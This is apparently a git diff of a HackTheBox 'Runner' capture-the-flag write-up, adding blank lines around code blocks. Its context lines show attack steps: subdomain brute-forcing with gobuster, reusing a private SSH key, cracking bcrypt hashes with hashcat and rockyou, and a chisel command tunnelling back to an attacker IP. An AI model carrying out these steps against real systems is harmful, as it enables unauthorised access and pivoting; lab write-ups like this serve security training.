@@ -19,6 +19,7 @@ NMAP
 Add runner.htb to /etc/hosts
 
 **<u>Subdomain enum</u>**
+
 ```bash
 gobuster vhost -u http://runner.htb -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -t 64 --append-domain
 ```
@@ -69,6 +70,7 @@ chmod 600 id_rsa
 
 ```
 - Find the username:
+
 ```bash
 grep -rnwi . -e "username"
 
@@ -110,6 +112,7 @@ hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 From Linpeas we can see docker being used and portainer is running, as well as port 9000 is open (which is normally used by docker)
 
 - Upload chisel and run:
+
 ```bash
 ./chisel client 10.10.14.29:8888 R:socks &
 
